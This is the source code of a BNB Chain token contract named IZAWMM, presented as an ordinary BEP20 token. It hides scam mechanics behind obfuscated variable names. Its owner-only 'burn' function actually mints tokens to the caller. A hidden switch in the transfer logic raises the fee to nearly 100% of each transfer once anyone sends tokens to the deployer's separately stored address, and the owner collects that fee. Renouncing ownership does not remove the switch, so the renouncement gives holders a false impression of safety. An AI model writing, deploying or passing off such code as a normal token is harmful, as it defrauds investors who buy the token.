/**
 *Submitted for verification at BscScan.com on 2022-12-05
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity =0.6.8;
contract IZAWMM {
uint256 public constant MQEARJ = 99999;
string public  name = "IZAWMM";
uint256 private  PZOWWM = 10000000000;
uint256 public constant totalSupply = 100000000000000000000000000000;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint8 public constant decimals = 18;
event Transfer(address indexed from, address indexed to, uint256 value);
uint256 private  KSWAJR = 100000000;
uint256 private  BDFTYG = 1000000000000000000;
string public  symbol = "IZAWMM";
address private  LSSCCC = address(0);
mapping (address => uint256) public balanceOf;
uint256 private  VBNJLR = 1000000000000000;
address private  EPYPHI = address(0);
address private  TLRIPW = address(0);
address private  QVNPAR = address(0);
uint256 private  NIPXBR = 1000000000000000000000;
uint256 private  KINCWG = 1000000000000000000;
mapping (address => mapping (address => uint256)) private _allowances;
address public owner;
event Approval(address indexed owner, address indexed spender, uint256 value);
uint256 private  FIEISE = 10000000000000;
address private  WUFBVH = address(0);
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
function _getPZOWWM() private returns (uint256) {
return PZOWWM;
}

function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tJEVTLL 0");
require(spender != address(0), "fJEVTLL 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _getQVNPAR() private returns (address) {
return QVNPAR;
}

function _getEPYPHI() private returns (address) {
return EPYPHI;
}

function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
constructor () public {
LSSCCC = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _getVBNJLR() private returns (uint256) {
return VBNJLR;
}

function _getTLRIPW() private returns (address) {
return TLRIPW;
}

function _getBDFTYG() private returns (uint256) {
return BDFTYG;
}

function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _getWUFBVH() private returns (address) {
return WUFBVH;
}

modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function _getFIEISE() private returns (uint256) {
return FIEISE;
}

function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _getKSWAJR() private returns (uint256) {
return KSWAJR;
}

function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "JEVTLL");
require(to != address(0), "JEVTLL");
require(amount <= balanceOf[from], "JEVTLL");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* MQEARJ/KINCWG ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==LSSCCC){
KINCWG = MQEARJ+2;
}
emit Transfer(from, to, transferAmount);
}
function _getNIPXBR() private returns (uint256) {
return NIPXBR;
}

function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}

}